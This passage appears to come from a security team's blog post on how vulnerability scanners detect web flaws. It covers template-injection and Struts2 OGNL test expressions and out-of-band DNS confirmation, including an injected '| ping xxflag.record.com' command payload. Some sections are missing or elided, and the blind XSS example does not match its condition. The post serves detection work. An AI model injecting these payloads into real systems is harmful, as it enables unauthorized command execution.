framework and integration. When the template content is controllable, various
traditional Web vulnerabilities appear. XSS and command execution can be done
through template injection or expression language injection. The Struts2
vulnerability was once popular, which I think can be classified into this type
of vulnerability. Usually the detection only needs to construct the expression
corresponding to the relevant template language, and the existing injection
expression will be executed and return the content:
    payload1: "... param=%(rand_num1 + rand_num2) ..."
    condition1: (rand_num1 + rand_num2) in response.content
    payload2: "... param=%(rand_num1 * rand_num2) ..."
    condition2: (rand_num1 * rand_num2) in response.content
    payload3: "... #response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(rand_str1+rand_str2),#response.flush(),#response.close() .."
    condition3: (rand_str1+ rand_str2) in response.content
#### Vi. Hash File
Sometimes the vulnerability is only related to a single file, such as a
vulnerability caused by Flash or JavaScript. At this time, you can use Hash
File to detect the vulnerability directly. When performing scanning detection,
you firstly need to download the corresponding file for a given path and then
calculate the hash and compare all the hash files with the statistics. If the
match succeeds, the vulnerability exists:
    payload: "http://vuln.com/vuln_swf_file.swf"
    condition: hash(vul_swf_file.swf) == hash_recorded
The above are examples of "direct judgment" in the Web vulnerability detection
method.
### 2\. Indirect judgement
There was once a time that I was overwhelmed because I couldn’t scan or detect
and there was no echo. At the beginning, I learned to use backhaul to judge.
Later, I got `python -m SimpleHTTPServer` as a simple real-time HTTP Server to
function as the connection monitoring, and then I got the paper "Data
Retrieval over DNS in SQL Injection Attacks". Although the technical point of
the article is to obtain blindly injected data of SQL through DNS query, the
"Data Retrieval over DNS" technology can be applied to most vulnerabilities
that cannot echo, and some public platforms come into being for security
research enthusiasts, such as cloudeye, DNSLog of Bugscan, and the CEYE.IO
platform I rewrote.
The technical principle of "Data Retrieval over DNS" is very simple. Firstly,
there needs to be a domain name that can be configured, such as ceye.io; then
set the nameserver of ceye.io as your own Server A through the agent; next
configure DNS Server on Server A, so that all queries for ceye.io and its
subdomains will go to Server A, and the domain query request can be monitored
timely, as is shown below:
Look directly at the examples (all backend platform uses CEYE.IO), if you
still don’t know how to use.
#### i. XSS (no echo)
It’s very common to use Blind XSS in security testing. "See the box and think
about X" is also the belief of every XSSer:
    payload: "... > ..."
    condition: {http://record.com/?blindssrf LOG} in HTTP requests LOGs
#### iv. RCE（no echo）
In the nix system environment, the `curl` command or the `wget` command is
generally used, while the windows system environment does not have such a
convenient command to directly access a link. I used to use the `ftp` command
and file downloads in PowerShell to access the log server. Now there has been
a more common practice which take both nix and Windows into consideration,
which is `ping` command. When “ping” a domain name, it will perform a
recursive DNS query process. At this time, the DNS query request can be
obtained at the back end. When the command is actually executed and the
platform receives the echo, the vulnerability exists.
    payload: "... | ping xxflag.record.com ..."
    condition: {xxflag.record.com LOG} in DNS queries LOGs
More non-echo Payloads can be viewed at http://ceye.io/payloads.
## Examples of Emergence Practice
Let’s take scanning test for example  
**Java deserialization (usual case: ftp/ping)**
Let's firstly talk about the Java deserialization vulnerability that broke out
at the end of 2015, which can be regarded as the most common Web vulnerability
at that time. I remember when the emergency scan was performed, WebLogic did
not get the PoC back. It used the connection method to judge while scanning
and detecting. Because the target to be tested contains *nix and windows
environment, it wrote two different Payloads. The generation part of the scan
code is as follows:
#### i. *nix
The real log contents at that time:
It can be seen that I uniquely identify the IP address and port of each test
by linking parameters when constructing Payload, so that when checking the
access log, we can determine which test target the record came from (because
of the entry IP and exit IP may be inconsistent). At the same time, it is
convenient to perform target confirmation and log processing when performing
batch scan.
#### ii. windows
The real log contents at that time:
Because `ftp` command on Windows cannot carry the same mark like parameter, it
is not easy to confirm the target by observing the FTP Server connection log
due to the fact that sometimes entry IP and exit IP may be inconsistent.
The above PoC and log screenshots were all left in the emergency last year.
Combined with the current knowledge, I realize that using the generic Payload
"ping xxxxx.record.com" and the "Data Retrieval over DNS" technology to
collect log information is more convenient to detect and scan. So recently, I
changed Payload combined with the CEYE.IO platform to test the impact
situation of WebLogic deserialization vulnerability.
Adding a random string as part of a subdomain is to prevent problems caused by
local DNS caching when detecting for multiple times. (The system usually
caches DNS records. After the same domain name is firstly resolved through the
network, the local cache is usually used directly instead of initiating the
query request for the second time). The corresponding platform records are as
follows, and it’s very useful to have such a platform by the way.
Welcome to talk about more with me related to scan detection.
## About Knownsec & 404 Team
Beijing Knownsec Information Technology Co., Ltd. was established by a group
of high-profile international security experts. It has over a hundred frontier
security talents nationwide as the core security research team to provide
long-term internationally advanced network security solutions for the
government and enterprises.
Knownsec's specialties include network attack and defense integrated
technologies and product R&D under new situations. It provides visualization
solutions that meet the world-class security technology standards and enhances
the security monitoring, alarm and defense abilities of customer networks with
its industry-leading capabilities in cloud computing and big data processing.
The company's technical strength is strongly recognized by the State Ministry
of Public Security, the Central Government Procurement Center, the Ministry of
Industry and Information Technology (MIIT), China National Vulnerability
Database of Information Security (CNNVD), the Central Bank, the Hong Kong
Jockey Club, Microsoft, Zhejiang Satellite TV and other well-known clients.
404 Team, the core security team of Knownsec, is dedicated to the research of
security vulnerability and offensive and defensive technology in the fields of
Web, IoT, industrial control, blockchain, etc. 404 team has submitted
vulnerability research to many well-known vendors such as Microsoft, Apple,
Adobe, Tencent, Alibaba, Baidu, etc. And has received a high reputation in the
industry.
The most well-known sharing of Knownsec 404 Team includes: [KCon Hacking
Conference](http://kcon.knownsec.com/#/ "KCon Hacking Conference"), [Seebug
Vulnerability Database](https://www.seebug.org/ "Seebug Vulnerability
Database") and [ZoomEye Cyberspace Search Engine](https://www.zoomeye.org/
"ZoomEye Cyberspace Search Engine").
* * *